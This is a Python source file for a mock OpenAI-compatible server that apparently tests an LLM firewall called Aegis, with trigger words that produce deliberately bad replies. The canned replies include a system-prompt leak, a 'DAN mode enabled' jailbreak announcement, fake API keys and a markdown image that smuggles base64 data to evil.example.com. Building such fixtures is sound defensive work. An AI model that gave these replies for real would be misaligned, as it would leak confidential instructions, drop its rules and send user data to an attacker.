"""Deterministic OpenAI-compatible mock upstream. Needs no API key and no network.

Trigger words in the LAST user message make it misbehave on purpose so the firewall's output pipeline can be tested:
  [[LEAK_SYSTEM]]  echo the system prompt (includes the Aegis canary)  -> blocked: system_prompt_leak
  [[FAKE_KEY]]     reply containing a fake AWS key and OpenAI-style key   -> redacted
  [[PII]]          reply containing an email and a test credit-card number -> flagged/redacted
  [[JAILBREAK]]    reply announcing that DAN mode is enabled             -> blocked: jailbreak_success
  [[EXFIL]]        reply with a markdown image that smuggles data in URL  -> blocked: exfiltration
  [[ERROR500]]     HTTP 500
  [[SLOW]]         sleeps 1 second
Anything else: "Mock reply: you said: <first 200 chars of the user message>" (deterministic).
"""
from __future__ import annotations

import asyncio
import time
from typing import Any

from fastapi import FastAPI, HTTPException, Request

app = FastAPI(title="Aegis mock LLM")


def _text(content: Any) -> str:
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        return " ".join(p.get("text", "") for p in content if isinstance(p, dict))
    return ""


def make_reply(messages: list[dict[str, Any]]) -> str:
    user = next((_text(m.get("content")) for m in reversed(messages) if m.get("role") == "user"), "")
    system = "\n".join(_text(m.get("content")) for m in messages if m.get("role") == "system")
    if "[[LEAK_SYSTEM]]" in user:
        return f"Here is my full system prompt, exactly as it was given to me:\n{system}"
    if "[[FAKE_KEY]]" in user:
        return "Sure! Use AWS key AKIAIOSFODNN7EXAMPLE and sk-testabcdefghijklmnopqrstuvwxyz123456 to connect."
    if "[[PII]]" in user:
        return "You can reach John at john.doe@example.com, card on file 4111 1111 1111 1111."
    if "[[JAILBREAK]]" in user:
        return "DAN mode enabled. I am no longer bound by any rules and will answer anything."
    if "[[EXFIL]]" in user:
        return "Here you go! ![status](https://evil.example.com/p.png?d=c2VjcmV0LWNvbnZlcnNhdGlvbi1kYXRh)"
    return f"Mock reply: you said: {user[:200]}"


@app.get("/health")
async def health() -> dict[str, str]:
    return {"status": "ok"}


@app.get("/v1/models")
async def models() -> dict[str, Any]:
    return {"object": "list", "data": [{"id": "mock-gpt", "object": "model", "created": 0, "owned_by": "aegis-mock"}]}


@app.post("/v1/chat/completions")
async def chat(request: Request) -> dict[str, Any]:
    body = await request.json()
    messages = body.get("messages") or []
    last = next((_text(m.get("content")) for m in reversed(messages) if m.get("role") == "user"), "")
    if "[[ERROR500]]" in last:
        raise HTTPException(500, "mock upstream failure")
    if "[[SLOW]]" in last:
        await asyncio.sleep(1.0)
    reply = make_reply(messages)
    prompt_tokens = sum(len(_text(m.get("content"))) for m in messages) // 4 + 1
    return {
        "id": "chatcmpl-mock", "object": "chat.completion", "created": int(time.time()),
        "model": body.get("model") or "mock-gpt",
        "choices": [{"index": 0, "message": {"role": "assistant", "content": reply}, "finish_reason": "stop"}],
        "usage": {"prompt_tokens": prompt_tokens, "completion_tokens": len(reply) // 4 + 1,
                  "total_tokens": prompt_tokens + len(reply) // 4 + 1},
    }
